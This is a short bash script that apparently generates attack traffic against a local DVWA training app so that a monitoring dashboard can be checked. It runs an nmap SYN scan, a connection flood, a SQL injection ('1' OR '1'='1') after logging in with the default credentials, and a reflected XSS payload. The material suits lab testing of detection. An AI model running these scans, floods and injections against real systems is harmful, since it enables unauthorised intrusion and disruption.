#!/bin/bash
TARGET=127.0.0.1
PORT=8080
JAR=/tmp/dvwa_cookies.txt
rm -f $JAR

echo "=== 1. Port scan ==="
nmap -sS -p 1-1000 $TARGET

echo "=== 2. Connection flood ==="
python3 - <<'PY'
import socket
for _ in range(500):
    s = socket.socket()
    s.settimeout(0.05)
    try: s.connect(("127.0.0.1", 8080))
    except Exception: pass
    s.close()
PY

echo "=== 3. SQL injection ==="
TOKEN=$(curl -s -c $JAR "http://$TARGET:$PORT/login.php" | sed -n "s/.*user_token' value='\([^']*\)'.*/\1/p")
curl -s -b $JAR -c $JAR -o /dev/null -d "username=admin&password=password&Login=Login&user_token=$TOKEN" "http://$TARGET:$PORT/login.php"
curl -s -b $JAR -G --data-urlencode "id=1' OR '1'='1" --data-urlencode "Submit=Submit" "http://$TARGET:$PORT/vulnerabilities/sqli/" -o /tmp/sqli_out.html

echo "=== 4. XSS ==="
curl -s -b $JAR -G --data-urlencode "name=<script>alert(1)</script>" "http://$TARGET:$PORT/vulnerabilities/xss_r/" -o /tmp/xss_out.html

echo "Done. Check the dashboard."
